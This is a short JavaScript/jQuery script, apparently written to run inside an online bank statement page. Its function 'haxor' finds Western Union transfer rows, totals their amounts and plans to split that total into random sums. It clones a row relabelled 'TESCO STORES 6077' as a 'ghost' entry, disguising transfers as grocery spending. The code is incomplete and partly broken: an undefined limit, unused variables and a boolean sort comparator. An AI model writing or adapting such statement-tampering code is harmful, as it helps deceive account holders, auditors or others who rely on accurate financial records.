var masterTableId = 'statementTable';
var found = false;
var timerMonitor = setInterval(haxor, 300);
var selector = '#' + masterTableId + ' td:contains("WESTERN UNION")';
var replacementRecipients = ['TESCO STORES 6077'];

function haxor() {
    clearInterval(timerMonitor);

    var $tBody = $('#statementTable tbody.cwa-tbody');
    var hackTargets = $tBody.find('tr.clickableLine').filter(function(idx, el) { 
        var row = el;

        return !$(el).hasClass('processed') && row.cells[1].textContent.includes('WESTER');
    });

	found = hackTargets.length > 0;
	
	if (found) {
        var wuRows = hackTargets;
        
        console.log('Hiding ' + wuRows.length + ' rows');
        wuRows.addClass('processed');
        // wuRows.hide();

        var totalDisplaced = 0;

        wuRows.each(function(idx, el) {
            var amount = $(el)[0].cells[4].textContent;

            totalDisplaced += parseFloat(amount);
        });

        console.log(`Total displaced amount ${totalDisplaced}`);

        var newEntries = 10;
        var distributedValues = distributeDisplacement(totalDisplaced, 5);

        console.log(distributedValues);

        var newRow = $(wuRows[0]).clone();

        newRow[0].cells[1].textContent = replacementRecipients[0];
        newRow.addClass('ghost');
        newRow.show();
        
        var $tBody = $('#statementTable tbody.cwa-tbody');

        $tBody.prepend(newRow);
    }
}

function distributeDisplacement(amountDisplaced, lowerLimit, upperLimit) {
    var remainingAmount = amountDisplaced;
    var distributedValues = [];
    var randomUpper = upperLimit;
    var randomLower = lowerLimit;

    while (true) {
        // randomUpper = Math.floor(Math.random() * randomUpper, upperLimit);
        // randomLower = Math.ceil(Math.random() * randomLower, lowerLimit);

        var value = Math.random() * (randomUpper - randomLower) + randomLower;

        remainingAmount = remainingAmount - value;

        if (remainingAmount > 0) {
            distributedValues.push(value)
        }
        else {
            distributedValues.push(remainingAmount + value);
            break;
        }
    }

    return distributedValues;
}

function sortTableByDate($tBody) {
    var rowsSorted = $tBody.find('tr.clickableLine').each(function() {
        var t = this.cells[0].textContent;

        $(this).data('_ts', t /*Date.parse(t)*/);
   });

   rowsSorted = rowsSorted.sort(function (a, b) {
       return $(a).data('_ts') < $(b).data('_ts');
   })
   
   $tBody.append(rowsSorted);
}

function gaussianRand() {
    var rand = 0;
  
    for (var i = 0; i < 6; i += 1) {
      rand += Math.random();
    }
  
    return rand / 6;
  }